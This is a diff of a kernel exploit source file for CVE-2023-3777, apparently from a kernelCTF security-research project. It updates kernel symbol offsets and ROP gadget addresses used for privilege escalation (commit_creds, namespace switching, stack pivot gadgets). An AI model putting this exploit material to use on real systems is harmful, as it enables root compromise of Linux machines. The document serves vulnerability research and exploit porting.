--- /home/jack/Documents/college/purdue/research/security-research/pocs/linux/kernelctf/CVE-2023-3777_lts/exploit/lts-6.1.36/exploit.c
+++ /home/jack/Documents/college/purdue/research/security-research/pocs/linux/kernelctf/CVE-2023-3777_lts/exploit/lts-6.1.36/exploit.c
@@ -26,13 +26,13 @@
 
 #include "netlink_utils.h"
 
-uint64_t find_task_by_vpid_off = __kexploit_kernel_offset(0x1b5600);
-uint64_t switch_task_namespaces_off = __kexploit_kernel_offset(0x1bd180);
-uint64_t commit_creds_off = __kexploit_kernel_offset(0x1bed10);
+uint64_t find_task_by_vpid_off = __kexploit_kernel_offset(0x1b64f0);
+uint64_t switch_task_namespaces_off = __kexploit_kernel_offset(0x1be070);
+uint64_t commit_creds_off = __kexploit_kernel_offset(0x1bfc00);
 uint64_t init_nsproxy_off = __kexploit_kernel_offset(0x26765c0);
 uint64_t init_cred_off = __kexploit_kernel_offset(0x2676800);
-uint64_t swapgs_restore_regs_and_return_to_usermode_off = __kexploit_kernel_offset(0x12010c6);
-uint64_t nft_counter_ops_off = __kexploit_kernel_offset(0x1b26680);
+uint64_t swapgs_restore_regs_and_return_to_usermode_off = __kexploit_kernel_offset(0x1201146);
+uint64_t nft_counter_ops_off = __kexploit_kernel_offset(0x1b27440);
 
 // new offsets
 // uint64_t find_task_by_vpid_off = 0xbb6f0;
@@ -73,14 +73,14 @@
 // uint64_t mov_rax_rcx_ret = 0x72342b; // TODO
 // uint64_t pop_rsp_ret = 0x282a0;
 
-uint64_t push_rbx_pop_rsp = __kexploit_rop_offset(0xf5b269, "push rbx; and byte ptr [rbx + 0x41], bl; pop rsp; pop rbp; jmp 0xffffffff82404b80");
-uint64_t pop_rdi_ret = __kexploit_rop_offset(0x88893, "pop rdi; jmp 0xffffffff82404b80");
-uint64_t pop_rsi_ret = __kexploit_rop_offset(0xd88a3, "pop rsi; jmp 0xffffffff82404b80");
-uint64_t mov_rdi_rax_ret = __kexploit_rop_offset(0x1142a6b, "mov rdi, rax; rep movsq qword ptr [rdi], qword ptr [rsi]; jmp 0xffffffff82404b80");
-uint64_t add_rax_rsi_ret = __kexploit_rop_offset(0x36590, "add rax, rsi; jmp 0xffffffff82404b80");
-uint64_t pop_rcx_ret = __kexploit_rop_offset(0x271ec, "pop rcx; jmp 0xffffffff82404b80");
-uint64_t mov_rax_rcx_ret = __kexploit_rop_offset(0x72342b, "mov qword ptr [rax], rcx; jmp 0xffffffff82404b80");
-uint64_t pop_rsp_ret = __kexploit_rop_offset(0x68961, "pop rsp; jmp 0xffffffff82404b80");
+uint64_t push_rbx_pop_rsp = __kexploit_rop_offset(0xf75ab9, "push rbx; and byte ptr [rbx + 0x41], bl; pop rsp; pop rbp; jmp 0xffffffff82404b80");
+uint64_t pop_rdi_ret = __kexploit_rop_offset(0x2352, "pop rdi; jmp 0xffffffff82404b80");
+uint64_t pop_rsi_ret = __kexploit_rop_offset(0x31fc, "pop rsi; jmp 0xffffffff82404b80");
+uint64_t mov_rdi_rax_ret = __kexploit_rop_offset(0x117b93b, "mov rdi, rax; rep movsq qword ptr [rdi], qword ptr [rsi]; jmp 0xffffffff82404b80");
+uint64_t add_rax_rsi_ret = __kexploit_rop_offset(0x37330, "add rax, rsi; jmp 0xffffffff82404b80");
+uint64_t pop_rcx_ret = __kexploit_rop_offset(0x197e3, "pop rcx; jmp 0xffffffff82404b80");
+uint64_t mov_rax_rcx_ret = __kexploit_rop_offset(0x72e85b, "mov qword ptr [rax], rcx; jmp 0xffffffff82404b80");
+uint64_t pop_rsp_ret = __kexploit_rop_offset(0x60b, "pop rsp; jmp 0xffffffff82404b80");
 
 uint64_t nft_counter_ops = 0;
 uint64_t kbase = 0;
